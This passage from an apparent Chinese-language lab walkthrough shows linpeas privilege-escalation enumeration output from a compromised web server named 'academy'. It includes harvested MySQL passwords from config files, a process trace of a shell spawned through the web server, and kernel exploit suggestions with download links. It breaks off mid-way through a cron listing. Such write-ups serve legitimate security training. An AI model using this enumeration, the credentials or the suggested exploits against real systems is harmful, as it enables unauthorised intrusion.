class="line">....</span><br><span class="line"></span><br><span class="line">╔══════════╣ Searching passwords <span class="keyword">in</span> config PHP files</span><br><span class="line">/usr/share/phpmyadmin/config.inc.php:<span class="variable">$cfg</span>[<span class="string">&#x27;Servers&#x27;</span>][<span class="variable">$i</span>][<span class="string">&#x27;AllowNoPassword&#x27;</span>] = <span class="literal">false</span>;                                          </span><br><span class="line">/usr/share/phpmyadmin/config.sample.inc.php:<span class="variable">$cfg</span>[<span class="string">&#x27;Servers&#x27;</span>][<span class="variable">$i</span>][<span class="string">&#x27;AllowNoPassword&#x27;</span>] = <span class="literal">false</span>;</span><br><span class="line">/usr/share/phpmyadmin/libraries/config.default.php:<span class="variable">$cfg</span>[<span class="string">&#x27;Servers&#x27;</span>][<span class="variable">$i</span>][<span class="string">&#x27;AllowNoPassword&#x27;</span>] = <span class="literal">false</span>;</span><br><span class="line">/usr/share/phpmyadmin/libraries/config.default.php:<span class="variable">$cfg</span>[<span class="string">&#x27;ShowChgPassword&#x27;</span>] = <span class="literal">true</span>;</span><br><span class="line">**/var/www/html/academy/admin/includes/config.php:<span class="variable">$mysql_password</span> = <span class="string">&quot;My_V3ryS3cur3_P4ss&quot;</span>;</span><br><span class="line">/var/www/html/academy/includes/config.php:<span class="variable">$mysql_password</span> = <span class="string">&quot;My_V3ryS3cur3_P4ss&quot;</span>;**</span><br><span class="line"></span><br></pre></td></tr></table></figure>
<ul>
<li><p>完整輸出</p>
  <figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">$ ./linpeas.sh</span><br><span class="line"></span><br><span class="line">                            ▄▄▄▄▄▄▄▄▄▄▄▄▄▄</span><br><span class="line">                    ▄▄▄▄▄▄▄             ▄▄▄▄▄▄▄▄</span><br><span class="line">             ▄▄▄▄▄▄▄      ▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄  ▄▄▄▄</span><br><span class="line">         ▄▄▄▄     ▄ ▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄ ▄▄▄▄▄▄</span><br><span class="line">         ▄    ▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄</span><br><span class="line">         ▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄ ▄▄▄▄▄       ▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄</span><br><span class="line">         ▄▄▄▄▄▄▄▄▄▄▄          ▄▄▄▄▄▄               ▄▄▄▄▄▄ ▄</span><br><span class="line">         ▄▄▄▄▄▄              ▄▄▄▄▄▄▄▄                 ▄▄▄▄ </span><br><span class="line">         ▄▄                  ▄▄▄ ▄▄▄▄▄                  ▄▄▄</span><br><span class="line">         ▄▄                ▄▄▄▄▄▄▄▄▄▄▄▄                  ▄▄</span><br><span class="line">         ▄            ▄▄ ▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄   ▄▄</span><br><span class="line">         ▄      ▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄</span><br><span class="line">         ▄▄▄▄▄▄▄▄▄▄▄▄▄▄                                ▄▄▄▄</span><br><span class="line">         ▄▄▄▄▄  ▄▄▄▄▄                       ▄▄▄▄▄▄     ▄▄▄▄</span><br><span class="line">         ▄▄▄▄   ▄▄▄▄▄                       ▄▄▄▄▄      ▄ ▄▄</span><br><span class="line">         ▄▄▄▄▄  ▄▄▄▄▄        ▄▄▄▄▄▄▄        ▄▄▄▄▄     ▄▄▄▄▄</span><br><span class="line">         ▄▄▄▄▄▄  ▄▄▄▄▄▄▄      ▄▄▄▄▄▄▄      ▄▄▄▄▄▄▄   ▄▄▄▄▄ </span><br><span class="line">          ▄▄▄▄▄▄▄▄▄▄▄▄▄▄        ▄          ▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄ </span><br><span class="line">         ▄▄▄▄▄▄▄▄▄▄▄▄▄                       ▄▄▄▄▄▄▄▄▄▄▄▄▄▄</span><br><span class="line">         ▄▄▄▄▄▄▄▄▄▄▄                         ▄▄▄▄▄▄▄▄▄▄▄▄▄▄</span><br><span class="line">         ▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄            ▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄</span><br><span class="line">          ▀▀▄▄▄   ▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄ ▄▄▄▄▄▄▄▀▀▀▀▀▀</span><br><span class="line">               ▀▀▀▄▄▄▄▄      ▄▄▄▄▄▄▄▄▄▄  ▄▄▄▄▄▄▀▀</span><br><span class="line">                     ▀▀▀▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▀▀▀</span><br><span class="line"></span><br><span class="line">    /---------------------------------------------------------------------------------\</span><br><span class="line">    |                             Do you like PEASS?                                  |                                       </span><br><span class="line">    |---------------------------------------------------------------------------------|                                       </span><br><span class="line">    |         Get the latest version    :     https://github.com/sponsors/carlospolop |                                       </span><br><span class="line">    |         Follow on Twitter         :     @hacktricks_live                        |                                       </span><br><span class="line">    |         Respect on HTB            :     SirBroccoli                             |                                       </span><br><span class="line">    |---------------------------------------------------------------------------------|                                       </span><br><span class="line">    |                                 Thank you!                                      |                                       </span><br><span class="line">    \---------------------------------------------------------------------------------/                                       </span><br><span class="line">          linpeas-ng by carlospolop                                                                                           </span><br><span class="line">                                                                                                                              </span><br><span class="line">ADVISORY: This script should be used <span class="keyword">for</span> authorized penetration testing and/or educational purposes only. Any misuse of this software will not be the responsibility of the author or of any other collaborator. Use it at your own computers and/or with the computer owner<span class="string">&#x27;s permission.                                                                                                </span></span><br><span class="line"><span class="string">                                                                                                                              </span></span><br><span class="line"><span class="string">Linux Privesc Checklist: https://book.hacktricks.xyz/linux-hardening/linux-privilege-escalation-checklist</span></span><br><span class="line"><span class="string"> LEGEND:                                                                                                                      </span></span><br><span class="line"><span class="string">  RED/YELLOW: 95% a PE vector</span></span><br><span class="line"><span class="string">  RED: You should take a look to it</span></span><br><span class="line"><span class="string">  LightCyan: Users with console</span></span><br><span class="line"><span class="string">  Blue: Users without console &amp; mounted devs</span></span><br><span class="line"><span class="string">  Green: Common things (users, groups, SUID/SGID, mounts, .sh scripts, cronjobs) </span></span><br><span class="line"><span class="string">  LightMagenta: Your username</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string"> Starting linpeas. Caching Writable Folders...</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">                               ╔═══════════════════╗</span></span><br><span class="line"><span class="string">═══════════════════════════════╣ Basic information ╠═══════════════════════════════                                           </span></span><br><span class="line"><span class="string">                               ╚═══════════════════╝                                                                          </span></span><br><span class="line"><span class="string">OS: Linux version 4.19.0-16-amd64 (debian-kernel@lists.debian.org) (gcc version 8.3.0 (Debian 8.3.0-6)) #1 SMP Debian 4.19.181-1 (2021-03-19)</span></span><br><span class="line"><span class="string">User &amp; Groups: uid=33(www-data) gid=33(www-data) groups=33(www-data)</span></span><br><span class="line"><span class="string">Hostname: academy</span></span><br><span class="line"><span class="string">Writable folder: /dev/shm</span></span><br><span class="line"><span class="string">[+] /usr/bin/ping is available for network discovery (linpeas can discover hosts, learn more with -h)</span></span><br><span class="line"><span class="string">[+] /usr/bin/bash is available for network discovery, port scanning and port forwarding (linpeas can discover hosts, scan ports, and forward ports. Learn more with -h)                                                                                     </span></span><br><span class="line"><span class="string">[+] /usr/bin/nc is available for network discovery &amp; port scanning (linpeas can discover hosts and scan ports, learn more with -h)                                                                                                                          </span></span><br><span class="line"><span class="string">                                                                                                                              </span></span><br><span class="line"><span class="string">                                                                                                                              </span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">Caching directories . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . uniq: write error: Broken pipe</span></span><br><span class="line"><span class="string">DONE</span></span><br><span class="line"><span class="string">                                                                                                                              </span></span><br><span class="line"><span class="string">                              ╔════════════════════╗</span></span><br><span class="line"><span class="string">══════════════════════════════╣ System Information ╠══════════════════════════════                                            </span></span><br><span class="line"><span class="string">                              ╚════════════════════╝                                                                          </span></span><br><span class="line"><span class="string">╔══════════╣ Operative system</span></span><br><span class="line"><span class="string">╚ https://book.hacktricks.xyz/linux-hardening/privilege-escalation#kernel-exploits                                            </span></span><br><span class="line"><span class="string">Linux version 4.19.0-16-amd64 (debian-kernel@lists.debian.org) (gcc version 8.3.0 (Debian 8.3.0-6)) #1 SMP Debian 4.19.181-1 (2021-03-19)</span></span><br><span class="line"><span class="string">Distributor ID: Debian</span></span><br><span class="line"><span class="string">Description:    Debian GNU/Linux 10 (buster)</span></span><br><span class="line"><span class="string">Release:        10</span></span><br><span class="line"><span class="string">Codename:       buster</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">╔══════════╣ Sudo version</span></span><br><span class="line"><span class="string">sudo Not Found                                                                                                                </span></span><br><span class="line"><span class="string">                                                                                                                              </span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">╔══════════╣ PATH</span></span><br><span class="line"><span class="string">╚ https://book.hacktricks.xyz/linux-hardening/privilege-escalation#writable-path-abuses                                       </span></span><br><span class="line"><span class="string">/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin                                                                  </span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">╔══════════╣ Date &amp; uptime</span></span><br><span class="line"><span class="string">Thu Feb 15 14:16:19 EST 2024                                                                                                  </span></span><br><span class="line"><span class="string"> 14:16:19 up  3:01,  1 user,  load average: 0.08, 0.02, 0.01</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">╔══════════╣ Any sd*/disk* disk in /dev? (limit 20)</span></span><br><span class="line"><span class="string">disk                                                                                                                          </span></span><br><span class="line"><span class="string">sda</span></span><br><span class="line"><span class="string">sda1</span></span><br><span class="line"><span class="string">sda2</span></span><br><span class="line"><span class="string">sda5</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">╔══════════╣ Unmounted file-system?</span></span><br><span class="line"><span class="string">╚ Check if you can mount umounted devices                                                                                     </span></span><br><span class="line"><span class="string">UUID=24d0cea7-c37b-4fd6-838e-d05cfb61a601 /               ext4    errors=remount-ro 0       1                                 </span></span><br><span class="line"><span class="string">UUID=930c51cc-089d-42bd-8e30-f08b86c52dca none            swap    sw              0       0</span></span><br><span class="line"><span class="string">/dev/sr0        /media/cdrom0   udf,iso9660 user,noauto     0       0</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">╔══════════╣ Environment</span></span><br><span class="line"><span class="string">╚ Any private information inside environment variables?                                                                       </span></span><br><span class="line"><span class="string">HISTFILESIZE=0                                                                                                                </span></span><br><span class="line"><span class="string">OLDPWD=/</span></span><br><span class="line"><span class="string">APACHE_RUN_DIR=/var/run/apache2</span></span><br><span class="line"><span class="string">APACHE_PID_FILE=/var/run/apache2/apache2.pid</span></span><br><span class="line"><span class="string">JOURNAL_STREAM=9:13249</span></span><br><span class="line"><span class="string">PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin</span></span><br><span class="line"><span class="string">INVOCATION_ID=e90a63eda0df49cf8bebcb515095709a</span></span><br><span class="line"><span class="string">APACHE_LOCK_DIR=/var/lock/apache2</span></span><br><span class="line"><span class="string">LANG=C</span></span><br><span class="line"><span class="string">HISTSIZE=0</span></span><br><span class="line"><span class="string">APACHE_RUN_USER=www-data</span></span><br><span class="line"><span class="string">APACHE_RUN_GROUP=www-data</span></span><br><span class="line"><span class="string">APACHE_LOG_DIR=/var/log/apache2</span></span><br><span class="line"><span class="string">PWD=/tmp</span></span><br><span class="line"><span class="string">HISTFILE=/dev/null</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">╔══════════╣ Searching Signature verification failed in dmesg</span></span><br><span class="line"><span class="string">╚ https://book.hacktricks.xyz/linux-hardening/privilege-escalation#dmesg-signature-verification-failed                        </span></span><br><span class="line"><span class="string">dmesg Not Found                                                                                                               </span></span><br><span class="line"><span class="string">                                                                                                                              </span></span><br><span class="line"><span class="string">╔══════════╣ Executing Linux Exploit Suggester</span></span><br><span class="line"><span class="string">╚ https://github.com/mzet-/linux-exploit-suggester                                                                            </span></span><br><span class="line"><span class="string">cat: write error: Broken pipe                                                                                                 </span></span><br><span class="line"><span class="string">cat: write error: Broken pipe</span></span><br><span class="line"><span class="string">cat: write error: Broken pipe</span></span><br><span class="line"><span class="string">cat: write error: Broken pipe</span></span><br><span class="line"><span class="string">[+] [CVE-2019-13272] PTRACE_TRACEME</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">   Details: https://bugs.chromium.org/p/project-zero/issues/detail?id=1903</span></span><br><span class="line"><span class="string">   Exposure: highly probable</span></span><br><span class="line"><span class="string">   Tags: ubuntu=16.04&#123;kernel:4.15.0-*&#125;,ubuntu=18.04&#123;kernel:4.15.0-*&#125;,debian=9&#123;kernel:4.9.0-*&#125;,[ debian=10&#123;kernel:4.19.0-*&#125; ],fedora=30&#123;kernel:5.0.9-*&#125;</span></span><br><span class="line"><span class="string">   Download URL: https://github.com/offensive-security/exploitdb-bin-sploits/raw/master/bin-sploits/47133.zip</span></span><br><span class="line"><span class="string">   ext-url: https://raw.githubusercontent.com/bcoles/kernel-exploits/master/CVE-2019-13272/poc.c</span></span><br><span class="line"><span class="string">   Comments: Requires an active PolKit agent.</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">[+] [CVE-2021-22555] Netfilter heap out-of-bounds write</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">   Details: https://google.github.io/security-research/pocs/linux/cve-2021-22555/writeup.html</span></span><br><span class="line"><span class="string">   Exposure: less probable</span></span><br><span class="line"><span class="string">   Tags: ubuntu=20.04&#123;kernel:5.8.0-*&#125;</span></span><br><span class="line"><span class="string">   Download URL: https://raw.githubusercontent.com/google/security-research/master/pocs/linux/cve-2021-22555/exploit.c</span></span><br><span class="line"><span class="string">   ext-url: https://raw.githubusercontent.com/bcoles/kernel-exploits/master/CVE-2021-22555/exploit.c</span></span><br><span class="line"><span class="string">   Comments: ip_tables kernel module must be loaded</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">╔══════════╣ Executing Linux Exploit Suggester 2</span></span><br><span class="line"><span class="string">╚ https://github.com/jondonas/linux-exploit-suggester-2                                                                       </span></span><br><span class="line"><span class="string">                                                                                                                              </span></span><br><span class="line"><span class="string">╔══════════╣ Protections</span></span><br><span class="line"><span class="string">═╣ AppArmor enabled? .............. You do not have enough privilege to read the profile set.                                 </span></span><br><span class="line"><span class="string">apparmor module is loaded.</span></span><br><span class="line"><span class="string">═╣ AppArmor profile? .............. unconfined</span></span><br><span class="line"><span class="string">═╣ is linuxONE? ................... s390x Not Found</span></span><br><span class="line"><span class="string">═╣ grsecurity present? ............ grsecurity Not Found                                                                      </span></span><br><span class="line"><span class="string">═╣ PaX bins present? .............. PaX Not Found                                                                             </span></span><br><span class="line"><span class="string">═╣ Execshield enabled? ............ Execshield Not Found                                                                      </span></span><br><span class="line"><span class="string">═╣ SELinux enabled? ............... sestatus Not Found                                                                        </span></span><br><span class="line"><span class="string">═╣ Seccomp enabled? ............... disabled                                                                                  </span></span><br><span class="line"><span class="string">═╣ User namespace? ................ enabled</span></span><br><span class="line"><span class="string">═╣ Cgroup2 enabled? ............... enabled</span></span><br><span class="line"><span class="string">═╣ Is ASLR enabled? ............... Yes</span></span><br><span class="line"><span class="string">═╣ Printer? ....................... No</span></span><br><span class="line"><span class="string">═╣ Is this a virtual machine? ..... Yes (vmware)                                                                              </span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">                                   ╔═══════════╗</span></span><br><span class="line"><span class="string">═══════════════════════════════════╣ Container ╠═══════════════════════════════════                                           </span></span><br><span class="line"><span class="string">                                   ╚═══════════╝                                                                              </span></span><br><span class="line"><span class="string">╔══════════╣ Container related tools present (if any):</span></span><br><span class="line"><span class="string">╔══════════╣ Am I Containered?                                                                                                </span></span><br><span class="line"><span class="string">╔══════════╣ Container details                                                                                                </span></span><br><span class="line"><span class="string">═╣ Is this a container? ........... No                                                                                        </span></span><br><span class="line"><span class="string">═╣ Any running containers? ........ No                                                                                        </span></span><br><span class="line"><span class="string">                                                                                                                              </span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">                                     ╔═══════╗</span></span><br><span class="line"><span class="string">═════════════════════════════════════╣ Cloud ╠═════════════════════════════════════                                           </span></span><br><span class="line"><span class="string">                                     ╚═══════╝                                                                                </span></span><br><span class="line"><span class="string">═╣ Google Cloud Platform? ............... No</span></span><br><span class="line"><span class="string">═╣ AWS ECS? ............................. No</span></span><br><span class="line"><span class="string">═╣ AWS EC2? ............................. No</span></span><br><span class="line"><span class="string">═╣ AWS EC2 Beanstalk? ................... No</span></span><br><span class="line"><span class="string">═╣ AWS Lambda? .......................... No</span></span><br><span class="line"><span class="string">═╣ AWS Codebuild? ....................... No</span></span><br><span class="line"><span class="string">═╣ DO Droplet? .......................... No</span></span><br><span class="line"><span class="string">═╣ Aliyun ECS? .......................... No</span></span><br><span class="line"><span class="string">═╣ IBM Cloud VM? ........................ No</span></span><br><span class="line"><span class="string">═╣ Azure VM? ............................ No</span></span><br><span class="line"><span class="string">═╣ Azure APP? ........................... No</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">                ╔════════════════════════════════════════════════╗</span></span><br><span class="line"><span class="string">════════════════╣ Processes, Crons, Timers, Services and Sockets ╠════════════════                                            </span></span><br><span class="line"><span class="string">                ╚════════════════════════════════════════════════╝                                                            </span></span><br><span class="line"><span class="string">╔══════════╣ Cleaned processes</span></span><br><span class="line"><span class="string">╚ Check weird &amp; unexpected proceses run by root: https://book.hacktricks.xyz/linux-hardening/privilege-escalation#processes   </span></span><br><span class="line"><span class="string">root         1  0.0  0.9 103800 10036 ?        Ss   11:15   0:01 /sbin/init                                                   </span></span><br><span class="line"><span class="string">root       329  0.0  0.8  40368  8120 ?        Ss   11:15   0:00 /lib/systemd/systemd-journald</span></span><br><span class="line"><span class="string">root       349  0.0  0.5  22196  5152 ?        Ss   11:15   0:00 /lib/systemd/systemd-udevd</span></span><br><span class="line"><span class="string">systemd+   419  0.0  0.6  93084  6504 ?        Ssl  11:15   0:00 /lib/systemd/systemd-timesyncd</span></span><br><span class="line"><span class="string">  └─(Caps) 0x0000000002000000=cap_sys_time</span></span><br><span class="line"><span class="string">message+   421  0.0  0.4   8980  4380 ?        Ss   11:15   0:00 /usr/bin/dbus-daemon --system --address=systemd: --nofork --nopidfile --systemd-activation --syslog-only</span></span><br><span class="line"><span class="string">  └─(Caps) 0x0000000020000000=cap_audit_write</span></span><br><span class="line"><span class="string">root       428  0.0  0.6 225824  6108 ?        Ssl  11:15   0:00 /usr/sbin/rsyslogd -n -iNONE</span></span><br><span class="line"><span class="string">root       429  0.0  0.2   8504  2840 ?        Ss   11:15   0:00 /usr/sbin/cron -f</span></span><br><span class="line"><span class="string">root       430  0.0  0.7  19488  7292 ?        Ss   11:15   0:00 /lib/systemd/systemd-logind</span></span><br><span class="line"><span class="string">root       436  0.0  0.2   6620  2936 ?        Ss   11:15   0:00 /usr/sbin/vsftpd /etc/vsftpd.conf</span></span><br><span class="line"><span class="string">root       443  0.0  0.3   7148  3612 tty1     Ss   11:15   0:00 /bin/login -p --</span></span><br><span class="line"><span class="string">root       644  0.0  0.4   7652  4504 tty1     S+   11:16   0:00  _ -bash</span></span><br><span class="line"><span class="string">root       453  0.0  0.6  15852  6912 ?        Ss   11:15   0:00 /usr/sbin/sshd -D</span></span><br><span class="line"><span class="string">root       521  0.0  2.2 214992 22840 ?        Ss   11:15   0:01 /usr/sbin/apache2 -k start</span></span><br><span class="line"><span class="string">www-data   546  0.1  2.3 218796 23308 ?        S    11:15   0:15  _ /usr/sbin/apache2 -k start</span></span><br><span class="line"><span class="string">www-data  1615  0.0  1.9 215484 19468 ?        S    12:57   0:01  _ /usr/sbin/apache2 -k start</span></span><br><span class="line"><span class="string">www-data  2138  0.0  0.0   2388   748 ?        S    13:44   0:00  |   _ sh -c uname -a; w; id; /bin/sh -i</span></span><br><span class="line"><span class="string">www-data  2142  0.0  0.0   2388   756 ?        S    13:44   0:00  |       _ /bin/sh -i</span></span><br><span class="line"><span class="string">www-data  2431  1.0  0.2   3404  2688 ?        S    14:16   0:00  |           _ /bin/sh ./linpeas.sh</span></span><br><span class="line"><span class="string">www-data  5153  0.0  0.1   3404  1224 ?        S    14:16   0:00  |               _ /bin/sh ./linpeas.sh</span></span><br><span class="line"><span class="string">www-data  5157  0.0  0.3   7960  3096 ?        R    14:16   0:00  |               |   _ ps fauxwww</span></span><br><span class="line"><span class="string">www-data  5156  0.0  0.1   3404  1224 ?        S    14:16   0:00  |               _ /bin/sh ./linpeas.sh</span></span><br><span class="line"><span class="string">www-data  1617  0.0  1.3 215516 13276 ?        S    12:57   0:00  _ /usr/sbin/apache2 -k start</span></span><br><span class="line"><span class="string">www-data  1632  0.0  1.3 215532 13296 ?        S    12:58   0:00  _ /usr/sbin/apache2 -k start</span></span><br><span class="line"><span class="string">www-data  1650  0.0  1.2 215348 12696 ?        S    12:58   0:00  _ /usr/sbin/apache2 -k start</span></span><br><span class="line"><span class="string">www-data  1655  0.0  1.8 215572 18844 ?        S    12:58   0:00  _ /usr/sbin/apache2 -k start</span></span><br><span class="line"><span class="string">www-data  1657  0.0  1.9 215484 19540 ?        S    12:58   0:00  _ /usr/sbin/apache2 -k start</span></span><br><span class="line"><span class="string">www-data  1663  0.0  1.9 215572 19468 ?        S    12:58   0:00  _ /usr/sbin/apache2 -k start</span></span><br><span class="line"><span class="string">www-data  1665  0.0  1.8 215476 18788 ?        S    12:58   0:00  _ /usr/sbin/apache2 -k start</span></span><br><span class="line"><span class="string">www-data  1668  0.0  1.9 215576 19692 ?        S    12:58   0:00  _ /usr/sbin/apache2 -k start</span></span><br><span class="line"><span class="string">mysql      541  0.0  9.1 1254884 92120 ?       Ssl  11:15   0:08 /usr/sbin/mysqld</span></span><br><span class="line"><span class="string">root       639  0.0  0.8  21024  8436 ?        Ss   11:16   0:00 /lib/systemd/systemd --user</span></span><br><span class="line"><span class="string">root       640  0.0  0.2  22836  2188 ?        S    11:16   0:00  _ (sd-pam)</span></span><br><span class="line"><span class="string">root       674  0.0  0.5   9488  5596 ?        Ss   11:20   0:00 dhclient</span></span><br><span class="line"><span class="string">root       690  0.0  0.5   9488  5736 ?        Ss   11:20   0:00 dhclient</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">╔══════════╣ Binary processes permissions (non &#x27;</span>root root<span class="string">&#x27; and not belonging to current user)</span></span><br><span class="line"><span class="string">╚ https://book.hacktricks.xyz/linux-hardening/privilege-escalation#processes                                                  </span></span><br><span class="line"><span class="string">                                                                                                                              </span></span><br><span class="line"><span class="string">╔══════════╣ Processes whose PPID belongs to a different user (not root)</span></span><br><span class="line"><span class="string">╚ You will know if a user can somehow spawn processes as a different user                                                     </span></span><br><span class="line"><span class="string">Proc 419 with ppid 1 is run by user systemd-timesync but the ppid user is root                                                </span></span><br><span class="line"><span class="string">Proc 421 with ppid 1 is run by user messagebus but the ppid user is root</span></span><br><span class="line"><span class="string">Proc 541 with ppid 1 is run by user mysql but the ppid user is root</span></span><br><span class="line"><span class="string">Proc 546 with ppid 521 is run by user www-data but the ppid user is root</span></span><br><span class="line"><span class="string">Proc 1615 with ppid 521 is run by user www-data but the ppid user is root</span></span><br><span class="line"><span class="string">Proc 1617 with ppid 521 is run by user www-data but the ppid user is root</span></span><br><span class="line"><span class="string">Proc 1632 with ppid 521 is run by user www-data but the ppid user is root</span></span><br><span class="line"><span class="string">Proc 1650 with ppid 521 is run by user www-data but the ppid user is root</span></span><br><span class="line"><span class="string">Proc 1655 with ppid 521 is run by user www-data but the ppid user is root</span></span><br><span class="line"><span class="string">Proc 1657 with ppid 521 is run by user www-data but the ppid user is root</span></span><br><span class="line"><span class="string">Proc 1663 with ppid 521 is run by user www-data but the ppid user is root</span></span><br><span class="line"><span class="string">Proc 1665 with ppid 521 is run by user www-data but the ppid user is root</span></span><br><span class="line"><span class="string">Proc 1668 with ppid 521 is run by user www-data but the ppid user is root</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">╔══════════╣ Files opened by processes belonging to other users</span></span><br><span class="line"><span class="string">╚ This is usually empty because of the lack of privileges to read other user processes information                            </span></span><br><span class="line"><span class="string">COMMAND    PID TID TASKCMD               USER   FD      TYPE DEVICE SIZE/OFF   NODE NAME                                      </span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">╔══════════╣ Processes with credentials in memory (root req)</span></span><br><span class="line"><span class="string">╚ https://book.hacktricks.xyz/linux-hardening/privilege-escalation#credentials-from-process-memory                            </span></span><br><span class="line"><span class="string">gdm-password Not Found                                                                                                        </span></span><br><span class="line"><span class="string">gnome-keyring-daemon Not Found                                                                                                </span></span><br><span class="line"><span class="string">lightdm Not Found                                                                                                             </span></span><br><span class="line"><span class="string">vsftpd process found (dump creds from memory as root)                                                                         </span></span><br><span class="line"><span class="string">apache2 process found (dump creds from memory as root)</span></span><br><span class="line"><span class="string">sshd Not Found</span></span><br><span class="line"><span class="string">                                                                                                                              </span></span><br><span class="line"><span class="string">╔══════════╣ Cron jobs</span></span><br><span class="line"><span class="string">╚ https://book.hacktricks.xyz/linux-hardening/privilege-escalation#scheduled-cron-jobs                                        </span></span><br><span class="line"><span class="string">/usr/bin/crontab                                                                                                              </span></span><br><span class="line"><span class="string">incrontab Not Found</span></span><br><span class="line"><span class="string">-rw-r--r-- 1 root root    1077 Jun 16  2021 /etc/crontab                                                                      </span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">/etc/cron.d:</span></span><br><span class="line"><span class="string">total 16</span></span><br><span class="line"><span class="string">drwxr-xr-x  2 root root 4096 May 29  2021 .</span></span><br><span class="line"><span class="string">drwxr-xr-x 74 root root 4096 Feb 15 14:08 ..</span></span><br><span class="line"><span class="string">-rw-r--r--  1 root root  102 Oct 11  2019 .placeholder</span></span><br><span class="line"><span class="string">-rw-r--r--  1 root root  712 Dec 17  2018 php</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">/etc/cron.daily:</span></span><br><span class="line"><span class="string">total 40</span></span><br><span class="line"><span class="string">drwxr-xr-x  2 root root 4096 May 29  2021 .</span></span><br><span class="line"><span class="string">drwxr-xr-x 74 root root 4096 Feb 15 14:08 ..</span></span><br><span class="line"><span class="string">-rw-r--r--  1 root root  102 Oct 11  2019 .placeholder</span></span><br><span class="line"><span class="string">-rwxr-xr-x  1 root root  539 Aug  8  2020 apache2</span></span><br><span class="line"><span class="string">-rwxr-xr-x  1 root root 1478 May 12  2020 apt-compat</span></span><br><span class="line"><span class="string">-rwxr-xr-x  1 root root  355 Dec 29  2017 bsdmainutils</span></span><br><span class="line"><span class="string">-rwxr-xr-x  1 root root 1187 Apr 18  2019 dpkg</span></span><br><span class="line"><span class="string">-rwxr-xr-x  1 root root  377 Aug 28  2018 logrotate</span></span><br><span class="line"><span class="string">-rwxr-xr-x  1 root root 1123 Feb 10  2019 man-db</span></span><br><span class="line"><span class="string">-rwxr-xr-x  1 root root  249 Sep 27  2017 passwd</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">/etc/cron.hourly:</span></span><br><span class="line"><span class="string">total 12</span></span><br><span class="line"><span class="string">drwxr-xr-x  2 root root 4096 May 29  2021 .</span></span><br><span class="line"><span class="string">drwxr-xr-x 74 root root 4096 Feb 15 14:08 ..</span></span><br><span class="line"><span class="string">-rw-r--r--  1 root root  102 Oct 11  2019 .placeholder</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">/etc/cron.monthly:</span></span><br><span class="line"><span class="string">total 12</span></span><br><span class="line"><span class="string">drwxr-xr-x  2 root root 4096 May 29  2021 .</span></span><br><span class="line"><span class="string">drwxr-xr-x 74 root root 4096 Feb 15 14:08 ..</span></span><br><span class="line"><span class="string">-rw-r--r--  1 root root  102 Oct 11  2019 .placeholder</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">/etc/cron.weekly:</span></span><br><span class="line"><span class="string">total 16</span></span><br><span class="line"><span class="string">drwxr-xr-x  2 root root 4096 May 29  2021 .</span></span><br><span class="line"><span class="string">drwxr-xr-x 74 root root 4096 Feb 15 14:08 ..</span></span><br><span class="line"><span class="string">-rw-r--r--  1 root root  102 Oct 11  2019 .placeholder</span></span><br><span class="line"><span class="string">-rwxr-xr-x  1 root root  813 Feb 10  2019 man-db</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">SHELL=/bin/sh</span></span><br><span class="line"><span class="string">PATH=/usr/local/sbin:/usr/local/bin:/sbin:/bin:/usr/sbin:/usr/bin</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">17 *    * * *   root    cd / &amp;&amp; run-parts --report /etc/cron.hourly</span></span><br><span class="line"><span class="string">25 6    * * *   root    test -x /usr/sbin/anacron || ( cd / &amp;&amp; run-parts --report /etc/cron.daily )</span></span><br><span class="line"><span class="string">47 6    * * 7   root    test -x /usr/sbin/anacron || ( cd / &amp;&amp; run-parts --report /etc/cron.weekly )</span></span><br><span class="line"><span class="string">52 6    1 * *   root    test -x 